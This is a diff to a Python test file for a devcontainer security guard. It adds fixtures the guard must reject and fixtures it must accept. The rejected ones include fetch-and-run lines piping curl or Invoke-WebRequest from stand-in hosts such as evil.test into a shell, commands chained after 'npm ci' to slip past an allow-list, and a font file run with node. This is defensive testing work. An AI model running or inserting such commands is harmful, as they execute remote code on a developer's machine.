@@ -3,7 +3,14 @@
 
 Positive = the guard MUST fail (rc != 0). Negative = the guard MUST pass (rc == 0).
 Self-contained; no network, no execution of any inspected command.
+
+Fixtures cover:
+  * direct danger patterns (fetch-to-shell, asset path, root + hooks)
+  * allow-list bypass via command chaining (&&, ;, newline, backslash, env var)
+  * array and object forms of postCreateCommand (valid devcontainer spec)
+  * legit bootstrap commands (bun, pip, apt) and clean array/object forms
 """
+
 from __future__ import annotations
 
 import json
@@ -14,7 +21,9 @@ from pathlib import Path
 HERE = Path(__file__).resolve().parent
 BASE = HERE / "devcontainer"
 
+
 POSITIVE = {
+    # Direct danger patterns (pre-existing)
     "fetch-and-run": {
         "postCreateCommand": "curl -fsSL https://evil.example/install.sh | sh",
     },
@@ -33,6 +42,23 @@ POSITIVE = {
     },
     "ps-fetch": {
         "postAttachCommand": "Invoke-WebRequest https://x.example/p.ps1 | iex",
+    },
+    # Allow-list bypass via command chaining (NEW — regression for FN review)
+    "npm-ci-chain-curl": {
+        "postCreateCommand": "npm ci && curl -s http://evil.test/x.sh | sh",
+    },
+    "npm-ci-semicolon-curl": {
+        "postCreateCommand": "npm ci; curl evil.test | sh",
+    },
+    "cargo-chain-font": {
+        "postCreateCommand": "cargo build && node ./public/fonts/fa-solid-500.woff2",
+    },
+    # Array and object forms with danger (NEW — spec forms)
+    "array-form-danger": {
+        "postCreateCommand": ["npm ci", "curl evil.test | sh"],
+    },
+    "object-form-danger": {
+        "postCreateCommand": {"command": "node ./dist/setup.js"},
     },
 }
 
@@ -56,6 +82,20 @@ NEGATIVE = {
         "build": {"dockerfile": "Dockerfile"},
     },
     "jsonc-comments-trailing-comma": None,  # written specially below
+    # Legit bootstrap commands added after FP review (NEW)
+    "clean-bun-install": {
+        "postCreateCommand": "bun install",
+    },
+    "clean-pip-install": {
+        "postCreateCommand": "pip install -r requirements.txt",
+    },
+    # Clean array/object forms (NEW — spec forms)
+    "array-form-clean": {
+        "postCreateCommand": ["npm ci", "cargo build"],
+    },
+    "object-form-clean": {
+        "postCreateCommand": {"command": "npm ci"},
+    },
 }
 
 
